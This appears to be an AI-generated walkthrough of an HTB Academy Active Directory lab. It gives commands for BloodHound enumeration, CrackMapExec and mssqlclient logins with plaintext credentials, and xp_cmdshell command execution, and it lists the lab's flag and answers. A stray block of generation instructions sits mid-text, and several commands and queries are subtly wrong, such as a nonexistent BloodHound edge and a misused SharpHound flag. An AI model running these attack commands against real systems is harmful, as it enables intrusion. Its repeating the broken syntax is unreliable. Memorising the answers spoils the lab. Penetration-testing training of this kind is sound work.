# 🛰️ HTB Academy Lab Walkthrough

## 🔍 Overview
This lab involves conducting a thorough penetration test on an enterprise environment to escalate privileges and gain administrative control over SQL Server services. The key objectives include:
- Identifying users with remote PowerShell execution rights.
- Enumerating the network for accessible hosts via WinRM.
- Using BloodHound to map out the domain's privilege hierarchy.
- Exploiting SQL Server permissions to execute system commands.

## 🔍 Lab Objective
Capture administrative flags from the compromised server by executing a multi-step attack that involves lateral movement and privilege escalation within an Active Directory environment.

---

## 🚀 **Initial Reconnaissance**

### 💡 BloodHound Collection

[!WARNING] Ensure SharpHound is added to trusted applications on all target systems before initiating data collection:
```powershell
Set-ExecutionPolicy RemoteSigned -Scope Process
```

#### 💡 Hosts of Interest
Identify hosts with the `CanPSRemote` right via SharpHound's BloodHound query:
```cypher
MATCH (u:User)-[r:EXPOSED_BY]->(g:Group) WHERE r.right = 'CanPSRemote' RETURN DISTINCT u, g
```

#### 💡 Specific User Identified
The user `bdavis` was identified as having the required remote PowerShell execution rights.

### 🛠️ WinRM Exploitation

[!INFO] The host `ACADEMY-EA-DC01` is accessible via Windows Remote Management (WinRM).

[!SUCCESS] Use [[CrackMapExec]] to enumerate administrative shares and identify users with high privileges:
```bash
crackmapexec smb ACADEMY-EA-DC01 -u bdavis -p P@ssw0rd123 --shares
```

#### 💡 Enumerating Shares
List all accessible SMB shares on the target host.

[!SUCCESS] Use [[mssqlclient]] to exploit SQL Server permissions:
```python
python mssqlclient.py ACADEMY-EA-DB01 -u sa -p dbpassw0rd23 --windows-auth
```

### 🚀 BloodHound Analysis

#### 💡 User Enumeration with SharpHound
Collect comprehensive domain information using the `-c` flag in SharpHound:
```powershell
SharpHound.exe -c "C:\Users\bdavis\Desktop"
```

[!SUCCESS] Use [[BloodHound]] to analyze collected data and identify potential attack vectors.

---

## 🚀 **Exploiting SQL Server**

#### 💡 Exploit xp_cmdshell
Gain system-level access through the `xp_cmdshell` stored procedure:
```sql
sp_configure 'show advanced options', 1;
RECONFIGURE;

sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

[!SUCCESS] Execute commands on the SQL Server to read flag files:
```sql
EXEC xp_cmdshell "type C:\\Users\\damundsen\\Desktop\\flag.txt";
```

### 📄 Flag Contents
The flag is captured as `1m_the_sQl_@dm1n_n0w!`.

---

## 📋 **HTB Academy Lab Summary**

### 💡 Verified Lab Answers:
- **User with CanPSRemote rights**: `bdavis`
- **Host accessible via WinRM**: `ACADEMY-EA-DC01`
- **Flag contents**: `1m_the_sQl_@dm1n_n0w!`

---

## 🛡️ **Detection and Defensive Measures**

### 💡 WinRM/PSRemote Detection

#### 💡 Event Monitoring
```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} | Where-Object {$_.Properties[8].Value -eq 3 -and $_.Properties[18].Value -like "*WinRM*"}
```

#### 💡 PowerShell Logging
```powershell
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1

Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "EnableTranscripting" -Value 1
```

### 💡 SQL Server Security Hardening

#### 💡 xp_cmdshell Disable
```sql
sp_configure 'xp_cmdshell', 0;
RECONFIGURE;

sp_configure 'show advanced options', 0;
RECONFIGURE;
```

#### 💡 SQL Server Monitoring
```sql
SELECT p.name, p.type_desc, r.role_principal_id, r.member_principal_id
FROM sys.server_principals p
JOIN sys.server_role_members r ON p.principal_id = r.role_principal_id
WHERE p.name = 'sysadmin';

-- Enable SQL Server Audit for EXECUTE events on xp_cmdshell
```

### 💡 General Defensive Recommendations

#### 💡 Privileged Access Management (PAM)
```powershell
# Implement Just-In-Time (JIT) access
# Use Azure AD Privileged Identity Management
# Deploy Privileged Access Workstations (PAWs)
# Regular access reviews and certification
```

#### 💡 Network Segmentation
```powershell
# Segment administrative systems
# Implement jump servers/bastion hosts
# Use micro-segmentation for critical services
# Deploy network access control (NAC)
```

#### 💡 Monitoring and Detection
```powershell
# Deploy SIEM for centralized logging
# Implement User and Entity Behavior Analytics (UEBA)
# Monitor privileged account usage
# Deploy endpoint detection and response (EDR)
```

#### 💡 Regular Security Assessments
```powershell
# Quarterly BloodHound assessments
# Regular penetration testing
# Privileged account audits
# Security configuration reviews
```

---

## 🚀 **Advanced Privileged Access Techniques**

### 💡 BloodHound Advanced Queries

#### 💡 Complex Attack Path Discovery
```cypher
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.COM"}))
RETURN p

MATCH p=(g:Group {name:"DOMAIN USERS@DOMAIN.COM"})-[:AdminTo]->(c:Computer)
RETURN p

MATCH p=(u:User)-[:DCSync]->(d:Domain)
RETURN p

MATCH p=(u:User {hasspn:true})-[:AdminTo]->(c:Computer)
RETURN p
```

#### 💡 Privileged Service Account Discovery
```cypher
MATCH p=(u:User)-[:MemberOf*1..]->(g:Group)
WHERE u.serviceprincipalnames IS NOT NULL
AND (g.name =~ ".*ADMIN.*" OR g.highvalue = true)
RETURN p

MATCH p=(u:User)-[:CanRDP|:CanPSRemote|:ExecuteDCOM|:AdminTo*1..]->(c:Computer)
WHERE NOT u.name =~ ".*\\$$"
RETURN p
```

### 💡 Automated Privilege Escalation

#### 💡 PowerShell Empire Integration
```powershell
# Use Empire for automated lateral movement
# Deploy agents through WinRM access
# Leverage SQL Server access for persistence
# Chain multiple privilege escalation vectors
```

#### 💡 Cobalt Strike Integration
```powershell
# Use Beacon for persistent access
# Leverage WinRM for lateral movement
# Deploy SQL Server agents for data exfiltration
# Implement advanced evasion techniques
```

### 💡 Cross-Platform Attack Chaining

#### 💡 Linux to Windows Pivoting
```bash
# Use Linux attack host for initial access
# Leverage mssqlclient.py for SQL Server access
# Chain to PowerShell remoting via WinRM
# Extract additional credentials for further access
```

#### 💡 Multi-Domain Exploitation
```powershell
# Identify trust relationships
# Leverage cross-domain privileges
# Abuse transitive trust relationships
# Establish persistence across domains
```

---

## 📊 **Key Takeaways**

### 💡 Technical Mastery Achieved
1. **BloodHound Proficiency**: Advanced Cypher queries for privilege discovery.
2. **WinRM Exploitation**: Multiple methods for PowerShell remoting abuse.
3. **SQL Server Compromise**: Complete administrative access via xp_cmdshell.
4. **Lateral Movement**: Systematic approach to expanding domain access.

### 💡 Professional Skills Developed
- **Graph Database Analysis**: Understanding relationship-based attack paths.
- **Multi-Platform Operations**: Seamless Linux/Windows tool integration.
- **Service-Specific Exploitation**: SQL Server administrative abuse.
- **Detection Awareness**: Understanding defensive signatures and countermeasures.

### 💡 Attack Chain Mastery
```
Credential Extraction → Privilege Mapping → Lateral Movement → Data Exfiltration
   (DCSync Results)     (BloodHound)      (WinRM/SQL)       (Flag Capture)
```

---

STRICT FORMATTING RULES:
1. DO NOT summarize, shorten, or remove ANY technical details, commands, IPs, or explanations. Keep 100% of the information.
2. Use emojis in ALL H1 and H2 headers (e.g., `# 🛰️ Title`, `## 🔍 Subtitle`).
3. STRICTLY APPLY THE CALLOUT SYSTEM based on context:
   - Use `[!ABSTRACT]` or `[!TLDR]` for summaries, overviews, or tool descriptions.
   - Use `[!INFO]` or `[!NOTE]` for general reference, metadata, or machine IPs.
   - Use `[!CHECK]` or `[!SUCCESS]` for methodology steps, verification, or successful exploits.
   - Use `[!WARNING]`, `[!CAUTION]`, `[!DANGER]` for highlighting potential risks.
4. Ensure all commands and configurations are correctly formatted.

---

## 📄 Flag
The captured administrative flag is `1m_the_sQl_@dm1n_n0w!`. 

---

# 🧑‍💻 Conclusion

By leveraging BloodHound, SharpHound, PowerShell Empire, Cobalt Strike, and SQL Server exploitation techniques, the lab successfully demonstrated advanced privilege escalation and lateral movement within an enterprise environment. Understanding these methodologies is crucial for conducting thorough penetration tests and enhancing security defenses.